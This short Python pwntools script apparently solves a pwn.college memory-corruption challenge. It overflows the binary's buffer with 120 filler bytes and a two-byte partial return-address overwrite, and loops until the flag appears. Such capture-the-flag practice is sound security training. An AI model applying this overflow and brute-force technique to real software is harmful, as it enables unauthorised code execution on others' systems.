from pwn import *

while True:
    p = process('/challenge/babymem_level7.1')

    p.recvuntil('Payload size:')
    p.sendline(b'122')

    payload = b'a' * 120 + p16(0x4f63) 

    #p.recvline('Send your payload')
    p.sendline(payload)

    #p.interactive()
    str = p.recvall(1)
    if str.find(b'pwn.college{') != -1:
        print(str)
        break

